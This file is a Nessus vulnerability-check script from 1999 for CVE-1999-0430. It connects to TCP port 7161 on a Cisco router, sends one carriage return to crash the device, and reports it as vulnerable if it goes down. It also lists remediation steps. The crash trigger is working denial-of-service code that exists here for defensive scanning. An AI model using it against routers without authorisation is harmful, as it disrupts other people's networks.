#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10046);
 script_bugtraq_id(705);
 script_cve_id("CVE-1999-0430");
 script_version ("$Revision: 1.18 $");

 name["english"] = "Cisco DoS";
 name["francais"] = "Déni de service Cisco";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash
the remote router using the vulnerability addressed
by the software bug ID CSCdi74333, that is,
by connecting this port and sending a carriage
return.

An attacker may use this flaw to make your
router crash continuously, thus preventing your
network from working properly.

Solution : filter incoming traffic to TCP port 7161.
Contact Cisco for a patch.

Risk factor : High";

 desc["francais"] = "Il a été possible de faire
planter le routeur distant en utilisant la
vulnérabilité décrite dans le bug Cisco d'identification
CSCdi74333, c'est à dire en se connectant à ce port
et en envoyant un caractère de retour chariot.

Un pirate peut utiliser ce problème pour faire
planter votre routeur continuellement, empechant
ainsi votre réseau de fonctionner correctement.


Solution : filtrez le traffic entrant en direction
du port 7161. Contactez Cisco pour un patch.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes a Cisco router";
 summary["francais"] = "Fait planter un routeur Cisco";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(7161);
 exit(0);
}

#
# The script code starts here
#

if(get_port_state(7161))
{
 soc = open_sock_tcp(7161);
 if(soc)
 {
  start_denial();
  data = raw_string(13);
  send(socket:soc, data:data);
  sleep(5);
  alive = end_denial();
   if(!alive){
  		security_hole(7161);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
 }
}
 
